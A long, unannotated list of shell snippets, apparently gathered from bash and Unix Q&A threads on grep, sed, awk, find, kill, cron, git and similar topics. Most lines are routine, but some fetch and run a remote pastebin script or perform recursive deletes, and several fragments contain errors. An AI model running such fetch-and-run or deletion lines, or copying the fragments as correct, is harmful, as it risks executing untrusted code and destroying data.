OLD_PATH=$PATH; export OLD_PATH
awk's BEGIN
GB FREE and -------
column number
GB FREE
print $4
column 1
NR>2 && $1~/DISK_2/
column 1
column 4
head -10 file
-A 2
-B 2
<p> </ p>
<p> </ p>
<TXT_accesp> and </ TXT_accesp>
<p> </ p>
</ TXT_accesp>
<root> ... </root>
man diff
0 0
roupIdx houseIdx numberOfRooms
grep '|1 2$'
grep '|0$'
$(cvs commit ...)
$(echo $(A) ...)
A = $(cvs commit ...)
sed "s%\(.*\),\(.*\)%echo \1 >> \2 %" inputfile.txt | sh
echo -e "a b\nc\nd e"
(( ... ))
(( ))
sed -e 's/"\([^"]*\)"/\1/g'
[ $n -eq $k ]
tr -d "\r"
declare -i
for file in $1/*
plutil -show file.plist >file.txt
plutil -dump file.plist >file.txt
chmod +x pldump
plutil -extract CFBundleShortVersionString xml1 -o - App-Info.plist
SELECT rowid, col FROM table1
UPDATE TABLEHERE SET sample='1' WHERE rowid=3
sh script.sh
chmod +x
sh script.sh
chmod +x script.sh
chmod u+x scriptname
ls -lA
. .profile
. .bashrc
chmod +x <File Name>
sudo install quickcommit.sh /usr/local/bin/quickcommit
Hello World!
Hello World!
cd $HOME/bin
chmod 700 script.sh
chmod +x run.sh
chmod 700 run.sh
-rwxr-xr-x  1 oracle oinstall   7473971 May 18  2017 migrate.linux-amd64
chmod +x migrate.linux-amd64
alias <alias namme> = <full script file path>'
source ~/.bashrc
convert: unable to open image ...
convert: missing an image filename
test.sh: line 6: color1: command not found
$ ssh -T git@github.com
git config -e
git config -e
vim .git/config
[remote "origin"]
echo -n
echo -n
echo -n foo bar
echo -e "foo bar\c"
printf %b "foo bar"
bash && cd ~/Work
bash --rcfile
svn commit
svn update --accept postpone
grep "\([[:alpha:]]*\)[[:space:]]*\1" -o <filename>
this is the the test file
the the
grep "\(\([[:alpha:]]*[[:space]]*\)\{4\}[[:space:]]*\1" -o <filename>
a b c d a b c d
grep "\(\([[:alpha:]]*[[:space]]*\)\{4\}.*\1" -o <filename>
| uniq -c | sort -n | sed -E -ne '/^[[:space:]]+1/!{s/^[[:space:]]+[0-9]+ //;p;}'
cat output*.txt > joined.tex
$ export $(ksh -c env | tr '\n' ' ')
/bin/sh /path/to/your/shell/script.sh
. /path/to/your/shell/script.sh
<p> </ p>
<TXT_accesp> </TXT_accesp>
seq 1 10000
printf "%06d" $NUM
man bash
man test
php (exec())
line 4: [6135222a12f06b2dfce6a5c1b736891e: command not found
<p> </ p>
<TXT_accesp> </TXT_accesp>
<p> </ p>
<TXT_accesp> </TXT_accesp>
<TXT_acceng> </TXT_acceng>
echo $'\r'
>/dev/tty 2>&1
3>&1 1>&2 2>&3 3>&-
source some_command --with --arguments DB=postgresq
. some_command --with --arguments DB=postgresql
export DB=postgresql
date --set=$dateVar
ssh xxx@remote_system "sudo date --set=$dateVar"
Feb 16
date -ud "$distance days ago 00:00:00"
date -d yesterday
date -d 'yesterday 12:00 AM'
date -d 6 days ago 00:00:00
date -ud "$distance days ago 00:00:00"
grep -f FILENAME
grep -P
-T -
-f -
-f -
for arg
mysql -uroot -ppass mydb
echo -e
echo -e
xargs -n1
sort -u
echo $(printf '%s\n' zebra ant spider spider ant zebra ant | sort -u)
xargs -r
ssh -f localhost sleep 7
kill pid
sleep 7;kill pid
ld: cannot find -lz
bash's find
head -c/--bytes
ls -1 $dir | wc -l
ls -l "$dir"
wc -l
wc -l
7 6 7
/sbin/ifconfig ...
export PATH=$PATH:/sbin; ifconfig ...
which ifconfig
type ifconfig
"two" "four"
source easybashgui; menu 1 2 3 ; clean_temp
set -eu
set -euB
help source
help source
sed -n "/^func ()/,/^}/p" myScript.sh
sed -n "/^func ()/,/^}/p" myScript.sh > func.sh; source func.sh; rm func.sh
./bootstrap.sh AWS
 # /donuts
base64 -d | tar -zvt
execlp("cat", "cat", NULL)
argv[argc - 1]
Error 4: no file was specified
for f in *jpg
egrep -n
egrep -v
egrep -i
gnu awk
egrep -w
gnu awk
egrep -f
let c++
devices=($(sudo blkid | egrep '^/dev/sd[b-z]'))
echo ${devices[*]}
echo ${#devices[*]}
/dev/sdb1: LABEL="ARCH_201108" TYPE="udf"
/dev/sdc1: LABEL="WD" UUID="414ECD7B314A557F" TYPE="ntfs"
nametab.sh New tab hellooooo
nametab.sh hellooooo
$ rename_tab 'NEW NAME HERE'
git rm --cached folder/path | rm -rf folder/path | git commit -m '...'
git rm
git commit
uuencode: fopen-ing /tmp/folder/file-01-11-2011.csv: Unknown system error
ksh script.sh
shell built-in
eat $s
help set
sed -n
join -1 1 -2 2 -a1 -t" "
data x;
merge file1 file2;
by common_column;
-a <filenum>
-a1 -a2
mkdir -p myDir
echo $BODY
$(cmd args)
ls -1 /home/folder/anotherFolder
defaults read
:!rgr test
:h shell
\ -i
exit $exit_status
trap 0
roupIdx houseIdx numberOfRooms
houseIdx = 0
numberOfRooms = 0
group_index 0 0
yum -y update
[blank line]
ls -l
-maxdepth 1
-type d
mkdir .
mkdir -p
-print 0
-print 0
-printf 0
ls -F | grep "/$"
find ./ -type d -exec rm -r {} \;
for i in 'ls'
rm -rf /path/to/mySubfolder/*/
$(LANG=C printf "%.3f" 13.234324245)
$devs, $dirs, $optses, $states
for ((i=0; i<max; i++))
emacs --eval "(ediff \"$1\" \"$2\")"
<:ttx>, <ol_2>
sort -d
-t \t
a a
-t $'\t'
-t \t
python -i
bash -i
bash -i
stty -echo
set +x
+ ls
@ECHO OFF
./really-benchmark-php 100 8 test.php
ab -n 1000 -c 100 http://x.x.x.x/
ab -n 100 -c 5 http://x.x.x.x/
ab -n 100 -c 10 http://x.x.x.x/drupal/
ab -n 100 -c 10 http://x.x.x.x/drupal-test/
ab -k -n 100 -c 100 -g step1.txt http://example.com/how-it-works
ab -k -n 100 -c 5 -g test2-c5-k.txt http://example.com/how-it-works
default action
awk 'NR>2{print}' filename
awk 'NR>2' filename
for i in *; do ...
$escaped = foo ('Led Zeppelin Discography (Complete)/[1969] Led Zeppelin I');
echo $escaped;
Led\ Zeppelin\ Discography\ \(Complete\)/\[1969\]\ Led\ Zeppelin\ I
find * -name \*.mp3
sh -x
set -x
flock -o FD
lsof -nP
strace your_script
echo "name:John Smith"
> $1
./script.sh my.config
do_recycle.sh myhostname
od -xcb check.sh
set -u
set -o nounset
for line in f
if b'align="center">' in line
cmd ; rc=$? ; echo $?
$( ... cmd ...)
exec echo
man bash
for i in plugins/*source*.jar
for loop
if conditional
VARNAME=VARVAL script_name
${vars} script_name
"Convert Format of Word Document"
man automator
PDFwriter for Mac
CUPS-PDF for Mac OS X
listOfNames="RA RB R C RD"
git pull
chmod +x myscript.sh
for (( i=0; i<${#arr[@]}; i++ ))
Press any key to continue...
awk '{print $4}'
if [[ $# < 0 ]] .... fi
$ submit 1
cp -r /first/path /second/path 2>/dev/null
crontab -e
at_every_minute of_every_hour any_day_of_the_month of_every_month any_day_of_the_week
read -u 3
exec 1>&2
exec 1>&2
exec 1>&2
help exec
> path
cat /dev/null > path
GNU awk
!($2 in a) {print $2,$1; next}
($2 in a) {"date +%s -d " $1 | getline var1; "date +%s -d " a[$2] | getline var2; var3=var2-var1; if (var3 > 4) print $2,$1,a[$2] }
Display Error if Null or Unset. If parameter is null or unset, the expansion of word (or a message to that effect if word is not present) is written to the standard error and the shell, if it is not interactive, exits. Otherwise, the value of parameter is substituted.
Display Error if Unset. If parameter is unset, the expansion of word (or a message to that effect if word is not present) is written to the standard error and the shell, if it is not interactive, exits. Otherwise, the value of parameter is substituted.
man bash
man bash
#!/usr/bin/env node
:help new-filetype-scripts
node -> javascript
(rainbow-delimiters-mode 1)
(add-hook 'sh-mode-hook (lambda () (message "hello")))
set -x
2.0, 2.1, 2.2, 2.3, 2.4, 2.5, 3.0, 3.1, 3.10, 3.11, 3.12, 3.13, 3.2, 3.3, 3.4, 3.5,3.6,3.7,3.8,3.9
-h -e -l -p
<(cat foo)
echo <(cat foo)
cat foo
NEWNAME =
PS4=$'+ %D{%s.%6.}\011 '
ant -Dbuild.sysclasspath=ignore
SELECT a, b, (SELECT c from d ...)
LIMIT 1
ruby -e STDOUT.sync=true -e "puts 'one'; raise 'two'" 2>&1 | cat
set -vx
date +"%T"
date +%s
textifyDuration $elpasedseconds
date +"%T"
date +"%s"
$(($(date ...) - $(date ...)))
$(echo $(date ...) - $(date ...) | bc | tr -d -)
HH MM SS.xxxx
base 60
file descriptor
file descriptor
file descriptor
ls | wc
cat errors
wc -l
wc -l errors
max_execution_time = 10
perl -C -ne'print grep {!$a{$_}++} split //'
split //
COMBINING ACUTE ACCENT
'á '
LATIN SMALL LETTER A
grep . file_name > outfile
chmod +x
./myscript.sh "Some message"
chmod 755 deploy.sh
else if
[ ... ] && [ ... ]
[ ... -a ... ]
[[ ... && ... ]]
set -xv
set +xv
set -xv
set +xv
script/rails s
RAILS_ENV=production MYTHICAL_VAR=someserver:8080 script/rails s
su - otheruser
sudo su - otheruser
bind '"\C-d":shell-kill-word'
bind '"\efoo":kill-word'
bind '"\e[3;3~":kill-word'
'ABC DEF'
man bash
set -o
PS="\u@\h:\w$ "
[ -e $VAR ]
[[ expression ]]
expression1 && expression2
-e xyzzy
[ -e "" ]
[ -e ]
-e 127.0.0.1\twpad.company.com
127.0.0.1     wpad.company.com
grep -P
(1 <something>)
myDir=(./*) if [ ${#myDir[@]} -gt 1 ]; then echo "there's something down here"; fi
use strict
use vars
'string' x 3
("list") x 3
("list" "list" "list")
"foo" . "bar"
<span class="title video-title"
sed -r -n
curl (6) couldn't resolve host
sudo echo nameserver 8.8.8.8 > /etc/resolv.conf
hg incoming
hg incoming
hg pull
hg incoming
hg pull
hg incoming
hg pull
hg incoming
Name James
ls | grep aaa
ps -ef | grep [m]ysqlplus
Bad substitution
sh scriptname
echo 'mystring' |cut -c1-5
NEWTESTSTRING=$(echo ${TESTSTRINGONE::5})
command substitution
find #{current_release}/migration/sub1 ...
find firstdir firstdir/sub1 -maxdepth 1
~ rvm install 1.9.2
scaleImage.sh -f=filename -d=directoryname
man bash
man [
man test
grep -q "$text"
"$name" = 'Bob'
[ ... ]
man [
man bash
ping -c4 $ip_address
mail -s
ping -c1 -W1 -q $server
nc -z -G 2 SERVER_HOST PORT
46     */6     *     *     *
10     2     *     *     *
15     3     *     *     *
20     4     *     *     *
31     5     *     *     *
31     17    *    *    *
echo $SHELL
echo $0
echo -n
start=$(($start + 1))
start=$[$start + 1]
@ % , ; : | _
Adygeya, Republic
grep -B MAX_INT -m 1 2011
sh -c
chmod +x script.sh
sh script.sh
[: : bad number
od -t x2
cat myfile.ini
du -h
sort -h
du -h file1 file2 ...
sort -hr
find -exec
find -exec
find -exec
ls -1
ls -S
ls -s
ls -h
ls -1Ssh
find -exec
find -exec
find . -type f -size +10M | xargs du -sh | sort -rn
cvlc -I rc --rc-host localhost:11337 -d
bash: /usr/bin/sudo: No such file or directory
bash -x remove-all.sh
xargs -n
[[ -z "$(find . -type f -name $fn)" ]] && echo $fn
man find
while [ $postid < 42000 ];
postid=$postid + 1;
dos2unix myscript.sh
rm myfile
grep "\\$" file.txt
"\\\$". Presumably, that's where you're getting the
fgrep '\$'
grep -F
fgrep '\$'
fgrep "\$"
"find: Invalid argument +c to -size.
specified path
second argument
sh script.sh
bash script.sh
echo {#a}
echo ${a}
while read
for i in $(cat)
grep's -A or -B options
sh -x search.sh "echo"
[ ]
if pgrep "bla bla" ; then echo "found" ; fi
ps aux
grep -q
$( )
$( )
ps aux | grep -q "bla bla"
grep -q
if $(true); then ...
if true ; then ...
$(echo true)
$(echo false)
$( )
$( )
pkg-config --cflags --libs gtk+-2.0
alias blah="/usr/bin/blah"
ls -a
prompt info
cd ~/
touch .bash_profile
open -e .bash_profile
. .bash_profile
sudo nano /.bash_profile
source /.bash_profile
open ~/.bashrc
open ~/.bash_aliases
touch ~/.bash_aliases && open ~/.bash_aliases
source ~/.bash_aliases
echo "alias clr='clear'" >> ~/.bash_aliases && source ~/.bash_aliases
alias clr='clear'
source ~/.bash_aliases
nano ~/.zshenv
alias py=python
nano ~/.bash_profile
alias py=python
source ~/.bashrc
/bin/bash foo.sh
#! /usr/bin/js
#!/bin/bash -v -x
for files in *.txt; do ...; done
(( ... ))
sh -x script
function cgi_get_POST_vars()
read -n $CONTENT_LENGTH QUERY_STRING_POST
t="${1//+/ }%%"
jar xf my.jar -C bar/
[[ ]]
grep -v
grep -n
; Dynamic Extensions ;
; Module Settings ;
export index;
"… $index … "
(sleep 5 && echo "Hello")
command1 | false
find / | false
command1 | non-existing-command
set -e
set -o pipefail
sleep 5
find /
find / |false
(sleep 5 && echo "Hello") | false
nonexisting-command | touch hello
sleep 5 | nonexisting-command
sleep 5
cat "$propFile"
wget -O- -q
find $WORKINGDIR -type f -name "customer*dat"
":vals= "
if ($i < 0) $i = -$i
[[ ]]
if [ $var1 > $var2 ] then echo ...
if [[ "$var1" > "$var2" ]]; then ...
if [ "$var" \> "$var2" ]; then ...
-z' and
) and other tests.  It has no support for lexical/string or pattern (regex nor glob) comparisons. The
built-in for
supports a number of the
/usr/bin/[' is literally a link to the
command and the shell built-ins for
bash manpage
"no such file or directory"
"rm long named file"
source script.sh
/bin/bash -- script.sh
grep -l
pkill -f
ps -ef
kill -9
ps -ef
grep -v grep
kill -9
ps pipe kill
ps -ef
xargs kill
kill -9
kill -9
man pkill
pkill -f PATTERN
killall -r my_pattern
killall -r chrome
pgrep -f
pkill -f
ps | grep
| grep -v
killall -r
pkill -f "^python3 path/to/my_script$"
man pkill
ps ax
grep -Eiv 'grep'
$(RANDOM 1+10)
r=$(( $RANDOM % 10 )); echo $r
r=$(( $RANDOM % 10 + 40 )); echo $r
login johndoe
sudo su johndoe
mctrl: Permission denied
man bash
man printf
man 3 printf
bash < <
curl http://pastebin.com/raw.php?i=wdtZYvvr
bash < <
man bash
ssh -v ...
/bin/bash 2>&1 | tee /dev/tty2
for f in $1/*
for f in $(find $1 -type f)
-type f
[[ -s "$HOME/.rvm/scripts/rvm" ]]
exists and is of size greater than zero
. "$HOME/.rvm/scripts/rvm"
rvm notes
[[ -s "/home/username/.rvm/scripts/rvm" ]] && source "/home/username/.rvm/scripts/rvm"  # This loads RVM into a shell session.
echo "after while loop"
ssh -n
ssh -n
here string
echo -n "string" | md5
echo "string" | md5
echo -n string | md5
echo "string" | md5
echo -n string | md5
md5 -s string
$1 = "a"
$2 = "b"
$1 = "a b"
$2 = ""
"a b"
(MYSQL: create table tablename like default_installation_table)
date +%s.%N -d $1
example.pl parametertext.txt
which perl
ls -l example.pl
chmod a+x example.pl
/usr/bin/env perl
chmod +x example.pl
6 24 264 264 12 0 0 0 0 0 0 0 0 0 0 0
myprocess.exe > output.log
[[ ]]
[ ]
[[ ]]
fgrep -x -f patternfile.txt data.csv
. ./foo
. foo
source foo
./spawn 1
echo "$password" | sha1sum - > password_file
folder f
sub-folder f1, f2, ...
bash v4
jobs -p | wc -l
find -print0
xargs -0 -P
-type f
Hello World:Andreas:
Hello World:Andreas
mkdir -p
mkdir -p
"$( ls /Applications )"
"kill ${PIDS[*]}"
getopts_problem.sh -td *.txt
getopts_problem.sh -td *.ABC
man bash
for file in "$fileList"
convert -size 416x318 xc:none -fill $SCALEFILE -draw "circle $SIZE" $NEWFILE
chmod +x script.sh
./script.sh sample.txt
echo BASHRC READ
alias name=value
kill -9
history -c
history -c
history -r
man bash
history -c
history -d
history 1
history | tail -n 1
history | LESSHISTFILE=/dev/null less
history -d
history 1
. script /my/path
./script /my/path
/home/jack/my\ folder/subfolder
/usr/bin/script : line 4 : cd: /home/jack/my\: no file or folder of this type
cd '$shorter'
cd "'"$shorter"'"
"double quotes"
'single quotes'
'single quotes'
"double quotes"
$(echo command substitution)
git irm
unzip -l #{pencast} | grep .aac | awk '{print $4;}'
| awk 'NR==1'
bash -l
uniq -c
sort filename | uniq -c
grep -v
type ls
printf %q $str
printf %q "$str"
hello world
p close(<fd>)
p creat("<path to file">, <perms>)
IMG_1067_CR2.jpg, IMG_1068_CR2.jpg...
IMG_0_CR2.jpg, IMG_1_CR2.jpg ...
shopt -s globstar
for img in *.jpg; do
for img in **/*.jpg; do
sleep $(( 1$(date +%N) % 60 )) ; dostuffs
at -f [file] [timespec]
echo [command] | at [timespec]
at [timespec]
-f [file]
now + 10 minutes
2071-05-31 - 5 hours 12 minutes UTC
cat script.sh | at now + $(($RANDOM % 10)) hours $(($RANDOM % 60)) minutes
at -f script.sh now + $(($RANDOM % 10)) hours $(($RANDOM % 60)) minutes
echo cat script.sh \| at now + $(($RANDOM % 10)) hours $(($RANDOM % 60)) minutes
echo at -f script.sh now + $(($RANDOM % 10)) hours $(($RANDOM % 60)) minutes
at -c [jobid]
" value= ....
#!/usr/bin/python -tt
#!command arguments
diet -Os gcc test.c
strip a.out
echo $SUBST
grep --line-buffered
(( ... ))
$(( ... ))
[[ ... ]]
shift [n]
set -- "${@:#}"
set -- "${@:3}"
top -d .5
top -d .5
ls -t|head -n 1
ls -tl | awk '{date=$6; file=$8; system("mkdir " date); system("mv $8 " " date"/")'
find -type d
; do
exit ${1:0}
exit $1
exit 0
exit 0
exit ${1:-0}
exit 0
exit $1
exit ${1:-0}
shopt -s expand_aliases
$(head -1 data.txt)
grep -r
parallel -j100% --pipepart --block 100M -a <very large SEEKABLE file> grep <...>
ls -i | sort -n | cut -d' ' -f2 | fgrep \.gz | parallel -j80% --group "gzcat {}" | parallel -j50% --pipe --round-robin -u -N1000 grep <..>
ls -i | sort -n | cut -d' ' -f2 | fgrep \.gz | parallel -j100% --group "gzcat {} | grep -lq <..> && echo {}
I have tried: mysql -u root -p password dbname << INSERT INTO tblename (fieldname) VALUES (LOAD_FILE('filename'));
mysql -u root -p password dbname << EOF INSERT INTO tblename (fieldname) VALUES ('$filename'); EOF
cat /path/to/file.txt
perl -MSub::Uplevel -e 'print "$Sub::Uplevel::VERSION"'
cd "~/Documents/My Project"
cd ~/"Documents/My Project"
cd ..
foo bar
foo bar
-maxdepth 1
-type f
-n 500
mkdir newdir.$$
mv "$@" newdir.$$/
sort -z
echo 1 > ../seq
read NR <../seq
expr $NR + 1 >../seq
sort -z
0,15,30,45  *  *  *  *  /home/personal/scripts/cronSqlprocedure.sh
{ ... }
for elem in $FILES
sqlcorn.sh: No such file or directory
>> sqlcronprocedure.sh
www.nba.com updated!
./testscript.sh www.nba.com Basketball
pmap 1234
cat /proc/self/maps
git svn info
git svn
git svn info
git svn info
void readyReadStandardOutput()
void readyReadStandardError()
rvm 1.9.2-p290@mybranch --default
rvm list
script_dir="$( cd "$( /usr/bin/dirname "$0" )" && pwd )"
WHERE image.file_name IN (...)
find -mtime
ulimit -Sc 1024
ulimit -Hc 1024
ulimit -c unlimited
ulimit -c 1024
ulimit -c 10240
$(( 100 * 1024 * 1024 ))
echo "uname -a" | sh
echo $((0xFF))
'create database $TARG_DB'
cat somefile | awk -f tail.awk 10
-v num=10
i = NR
echo "foo" |awk -vt=10 …
pgrep $(basename $0)
pgrep test.sh
[direcorty (master)]$
Anders-imac:~ anderskitson$
ln -s
man bash
set -f
man bash
{ .. }
man bash
echo $$
echo 2$$
{ .. }
{ X=ABC; echo $X; }
echo $X
{ X=SUB ; sleep 1; } &
{ X=SUB ; sleep 1; }
(X=ABC ; echo $X)
wget --mirror --convert-links --html-extension --wait=1 https://example.com/
if [[ $cur =~ ^(\$\{?)([A-Za-z0-9_]*)$ ]]; then
wc -c
wc -c < err
echo "stdout"; echo "stderr" >&2
{ ... }
{ ... }
| stdout_command
| stderr_command
a -> c
b -> d
ls / /foo
sort file.txt > file.txt
pgrep -l httpd
ps cax | grep command
ps cax | grep aasdfasdf | grep -o '^[ ]*[0-9]*'
./running "httpd"
ps ax
./running "mysql"
grep -v
-o <field,field,...>
pgrep "mysqld"
ps -o pid= -p $PID
[ $pid ] && [ -d /proc/$pid ] && command
ls -t1
echo $BASHPID
echo $$; ( bash -c 'echo $PPID'; )
sleep 555
(echo "$BASHPID" > /tmp/_tmp_pid_ && sleep 555 &) && ps -ho pid --ppid=$(< /tmp/_tmp_pid_)
<string>My New Name</string>
grep foo bar.txt > output.txt
grep foo bar.txt > output.txt
eval ...
bash -c "..."
grep -c { *
grep -c } *
{ } { } { }
uname -a
uname -s
shopt -s nullglob
ls foo*
shopt -u nullglob
mapfile array < <(shopt -s nullglob; for f in ./*; do echo "$f"; done)
iptables -L
BSD Name
set +e
set -e
grep .log
cat -vet ./script1.sh
chmod +x ./script2.sh
unknown_b8-8d-1b-3d-0b-3d:myscript liuren$
# do something else
echo $'a\nb'
echo -e
echo -e
echo -e
cat file | xargs rm
[ "x$var2" = "x" ]
GNU grep 2.5.1
for loop
for base_name in $(find . -name "Ado*")
for base_name in ./Adobe ReaderScreenSnapz001.jpg ./Adobe ReaderScreenSnapz002.jpg
for base_name in
while read base_name
find ... | while read ...
-d ''
else continue
echo $TEXT
${FUNCNAME[ 0 ]}
export test_environment=1
export test_environment=2
export test_environment=1
bash --version
Associative array
curl -L ...
... | xargs -n 1 -P 8 curl -L ...
cal -h 02 2012 | $magicline
wc -w
logfile flush seconds
git filter-branch
git filter-branch '/path/to/script.sh' -- --all
tail -n +34
more +34
more +34 src/unlagged.cpp < /dev/null
alt + space
-type f
-type f
ls -1 | wc -l
ls -1
ls -l
ls -l | grep -v ^l | wc -l
ls -l /usr/bin/ | grep -v ^l | wc -l
wc -l
find $i -type f
wc -l
find | wc -l
find . -type f | wc -l
wc -l
-not -path
ls -p | grep -v /
sort -V
su - user
while sleep DURATION; do ... ; done
ps -ef
ps -ef
( ... )
$( ... )
echo ... | while ...
{ sed '$/^$/d' Packages; echo; } | awk ...
sprintf ("%02d min %02d s", $delta_min, $delta_s);
dddd-dd-dd dd:dd:dd
grep pattern file
help .
kill -TERM
kill -KILL
kill -9
fuser -k 3000/tcp
$0, $#, $1
echo $0
echo $#
echo $1
man diff
git add
git stash apply
git diff --cached --quiet
git diff --cached
git status -s
mv $VAR1 $VAR2
bash -c ...
find /haystack | grep /needle/
perl -pe's/\./\@/g'
cd /path/to/your/application
$ sort -t, -k1,1 test
date -j +'%s' "0143.38"
read -e
-e commandline
-E commandline
syntax error: invalid arithmetic operator (error token is ".0.1 >= 5")
f1 = '512kB'
f1 = '1MB'
ls !$
!$ "single argument"
expanded_string single argument
2-ghb-16-500.ini --stats-file=h264_sss-l2-2-ghb-16
restart machine each 1 min
[[ $1 = action ]] && echo action "restart machine each 1 min
typeset -N
`cat fileUsedToPopulate.txt
for i in 2 4 6 ; do
echo $?
disown -a
SELECT * FROM some_table WHERE foo=\'Can\'\'t read\''
rm -rf
rm -f
/usr/bin/env zsh -c "echo $fpath"
chgrp trusted_users my_script.pl
chmod u=rwx,g=rx,o= my_script.pl
!#/usr/bin/gawk -f
find .
for i in $(find .)
config.sh: line 1: local: can only be used in a function
echo FOO=bar
tail -F mysql.log
echo "yes"
shopt -s expand_aliases
Ort at the beginning of the line. When I use only "echo "\
sed 's/\r//g'
find -print0 | xargs -0
> file.txt
find . -name \*.cc -print0 -or -name \*.h -print0 | xargs -0 grep "hello"
shopt -s nullglob
wine program.exe
echo -n
... | awk '{print $NF}'
tail -c4
ls -l
ls -l
sed -n 's/.*\(@.*\)/\1/p'
sed -n 's/.*\s(@.*\)/\1/p'
| tee /tmp/script1.log
ssh $host "stat -c%s '$src_dir/$filename'; cat '$src_dir/$filename'"
ps -el | grep Firefox
grep -v /bin/bash'
TMP=$(ps -el)
grep Firefox
grep [F]irefox
git stash
git merge testing
git reset --hard
unset GIT_DIR
git push
paste <(${cmd[1]}) <(${cmd[2]})
{ cat -<<EOS ... EOS }|
#!/bin/awk -f
chmod 755 myScript.awk
myScript.awk BigFile > AvgsFile
cat /proc/stat
grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage "%"}'
$12 ~ /[0-9]+/
psutil.cpu_percent(interval=None, percpu=False)
psutil.cpu_percent(interval=None, percpu=False)
trap "..." EXIT
Popen(['find', '.', '-iname', '"*.sln"'], shell=True)
AS Database
AS db
script-security 3
[ has too many arguments
[[ ]]
[ ]
$ sed -n 23,56p yourfile
$ sed -n '23,56p;57q' yourfile
... perl -i.old -pe 's/from/to/g'
... > "$(basename $f)-renamed.txt" ...
[ -L "$f" ] && [ -e "$f" ]
script.sh site.com
mkdir folder/subfolder/
# THE SCRIPT ITSELF
# END
THE FOLLOWING DATA HAS BEEN WRITTEN TO STDOUT
STDOUT HAS NOT BEEN TOUCHED
echo Hello World
TMP_SIZE=$(stat -f %z "$TMP")
if [ $TMP_SIZE -gt 0 ]
sort -R
git rm
git commit
git push
git rm
IFS='whatever' set -- $var
sh -c
mklink /D C:\Cygwin C:\Dev\Cygwin
export DISPLAY=localhost:1.0
export DISPLAY=localhost:0.0
mkdir -p
awk -F';' '{printf("%s %i", $3, $7*1000);}'
system(); exit $rc;
$(head -n 1 $i)
./lab4 file filename1
[[ ]]
[ ]
bind -p | grep "not bound" | grep -v "self-insert" | cat >> keycodes-notbound.txt
bind -p | grep -v "not bound" | grep -v "self-insert" | cat >> keycodes-used.txt
help bind
kill -l $SIGNAL_NUM
CODE: 130
CODE: 0
while : ; do : ; done
tail -n +2 is
pgrep -l /?
man kill(2)
set -x
bad array subscript
first command
ls -ltr
wget --help
man wget
exec("rm -rf a\\\\");
mkdir -m777 myFolder;
$file = escapeshellarg("/root/myFolder/1.txt");
$del = shell_exec("rm -rf $file");
select 1 from dual
select 1 from dual
-w 2
sleep 5
find . -type f \( -name "*.css" -o -name "*.html" -o -name "*.sass" \) -exec perl -p -i -e "s/[ \t]*$//g" "{}" \;
s/[ \t]*$//g
s/ *$//g
bash 4.x
File::Path qw(make_path)
gzip -c myLog.log >> myLog.log.gz
gzip logs/a.log
user@host> ls ~/
ls ~/
set -- gr3
{ cat ... } |
/usr/bin/python demo.py
/bin/bash demo.py
bash demo.py
bash -c ./demo.py
bash -c ./demo.py
sh -c ./demo.py
./sleep.py 10; ./test_client1.py
./sleep.py 10; ./test_client2.py
sleep 3
set -euo pipefail
"-", "_", "1", "$", "^"
IDVAR    VAL
$0=t "\t" $0
-exec ls -d
head -1
file a
file b
set +H
awk -F'|' '{print $1;}' file.csv > file2.csv
awk '{print $1}'
awk '{printf "%s %s\n", $2, $1}'
uniq -c
files=$(ls *.h)
sort -k2,3nr
pdffiles = $filename $pdffiles
./mergepdfs.sh: line 39: pdffiles: command not found
/bin/sh: declare: not found
["declare","-a ids"]
arr=( $line )
/bin/sh -x script
#!/bin/sh -x
set -x
xargs -0
ln file hardLinkToFile
ls -li srcfile destfile
inotifywait $file; lsof $file
done < ${DSWildCardFile}
/#/{ ... }
sub(/# +/,"#")
sub(/# +/,"#");
perl -i.bak -lnwe '....'
tail -f
sudo -u test-user mysql -U test_traffic traffic
bash: a=b: command not found
echo $x
$(echo ls)
echo $x
eval find . -name "'wibble.foo'" -o "'*.bar'"
eval "find . $ftypes"
grep -B 10 -A 100 "Caused By" app.log
df -kb $PATH | awk 'NR == 2 {print $4}'
mkdir -p $PATH
rmdir $PATH
mkdir -p
rmdir $PATH
sed -i 's/ //g' your_file
sed -i 's/^ *//' your_file
git ls-tree master -r --name-only | grep htm | xargs -n1 -I{} bash -c 'recode "$(file -b --mime-encoding {})..utf-8" {}'
awk '{ print $1 $2 }'
awk '{ print $2 }'
do sleep 1
while read
exec < /dev/stdin
ps -ef | grep <username>
ps -eo etime,pid
stat -t /proc/<pid> | awk '{print $14}'
date +%s
sudo gvim &
ps aux | grep gvim
root     11803  0.0  0.0  12064  2776 pts/3    T    12:17   0:00 sudo gvim
ps aux | awk '/gvim/ {print $2}'
ps aux | awk '/gvim/ {print "sudo kill -9 "$2}' | bash
ps --ppid
sleep 1
man ps
*/1 * * * * (cd /tmp; /bin/bash test.sh)
found: [     mystring:]
ln -sf
'0 1 2 3'
\'0 1 2 3\'
shift $((OPTIND - 1))
echo "arguments: $@"
theStr[4] = 'A'; // Zero based index.
echo $theStr | sed s/./A/5
show int
set bytesnow [exec grep "packets input" \< showint | cut -d \  -f 9]
exec grep
git log -g HEAD
git checkout branch
git checkout HEAD@{1}
git checkout HEAD@{10.minutes.ago}
grep nonexistant file
grep -v nonexistant file
-i ""
ls -l
command --help
git help
git help commit
$(shell ...)
javac HelloWorld.java
-bash: swipl: command not found
grep -q
grep -w
test $? -ne 0
sed: 1: "'s/mon.tex/salut.tex/g'": invalid command code '
Quote Removal
sed -i
sed 's/mon.text/foo.tex/g'
LOGTYPES =
[$type == cpanel]
[ $type == cpanel ]
xset -q
xset -q
echo $${sources[0]}
--input output/js/main.js
man bash
dup2(1, 2)
CTRL + X
-p test
grep -v grep
if [ $? -eq 0 ]
ps ... grep ... grep
brace expansion
variable expansion
exit 1
-command {& .\test.ps1; exit $lastexitcode}
pgrep -fl mydaemon.py
foo --activate
foo - --activate
foo - --activate
foo --activate
-t 0
-t 2
[ -t 1 ]
./myscript.sh > /dev/pts/1234
[ -t 1 ]
set -vx
service mysql restart
su -
apachectl restart
#define GPSVersion 0x000;
#define GPSVersion 0x000
grep -r
tr -s ' \t' '\t'
cut -f3
tr '[:upper:]' '[:lower:]' < input.txt > output.txt
sed ... *.txt
-maxdepth 1
-exec ... +
cat > xxx
cat > xxx
(while ... done < $PIPE_X; echo FINISHED; ) &
sleep 1
ssh server command
sleep 3
ssh localhost
ssh server
sleep 2
ssh -n
ssh -f
man ssh
bash --noprofile --norc
env -i bash --norc --noprofile
nm -A *.so | grep func
chmod +x script.sh
-o history
set -o history
echo foo
/usr/bin/xmessage -buttons "button a","button b" some text to test
/path/to/script.bash '/usr/bin/xmessage -buttons "button a","button b" some text to test'
eval "$1"
script.bash -options arguments etc -- /usr/bin/xmessage -buttons "button a","button b" some text to test
